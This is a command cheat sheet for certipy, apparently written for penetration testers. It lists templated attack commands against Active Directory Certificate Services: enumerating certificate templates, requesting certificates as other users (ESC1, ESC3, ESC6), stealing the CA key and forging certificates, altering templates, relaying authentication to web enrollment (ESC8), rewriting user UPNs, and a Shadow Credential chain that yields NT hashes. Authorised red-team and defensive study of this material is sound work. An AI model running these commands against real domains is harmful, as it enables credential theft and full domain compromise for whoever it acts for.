# certipy

% adcs, certificate, pki, windows, Active directory, template, shadow credential

## certipy - list certificate templates
#plateform/linux #target/remote #cat/RECON
```
certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> 
```

## certipy - request certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority>
```

## certipy - authenticate with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certipy auth -pfx <pfx-file> 
```

## certipy - authenticate through LDAP (Schannel) with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certipy auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
```

## certipy - Golden Certificate - steal CA certificate and private key
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca -u <user>@<domain> -p '<password>' -backup -ca <certificate-authority> -target-ip <ca-ip>
```

## certipy - Golden Certificate - forge certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy forge -ca-pfx <pfx-file> -upn <user>@<domain> -crl ldap://<dc-ip>:389
```

## certipy - request certificate for another user - ESC1 - ESC6
#plateform/linux #target/remote #cat/ATTACK
```
certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -upn <targeted-user>@<domain>
```

## certipy - request certificate on behalf of with Certificate Request Agent certificate - ESC3
#plateform/linux #target/remote #cat/ATTACK
```
certipy req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
```

## certipy - modify template in order to make it vulnerable to ESC1 - ESC4
#plateform/linux #target/remote #cat/ATTACK
```
certipy template -u <user>@<domain> -p '<password>' -template <template> -save-old
```

## certipy - Issue certificate for specific request id - ESC7
#plateform/linux #target/remote #cat/ATTACK
```
certipy ca -u <user>@<domain> -p '<password>' -ca <certificate-authority> -issue-request <csr-id>
```

## certipy - relay authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy relay -ca <ca-fqdn>
```

## certipy - relay domain controller authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy relay -ca <ca-fqdn> -template 'DomainController'
```

## certipy - Modify user upn to another one - ESC9 - ESC10
#plateform/linux #target/remote #cat/ATTACK
```
certipy account update -u <user>@<domain> -p '<password>' -user <targeted-user> -upn <administrator-user>
```

## certipy - Get NT hash - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
```
certipy shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>
```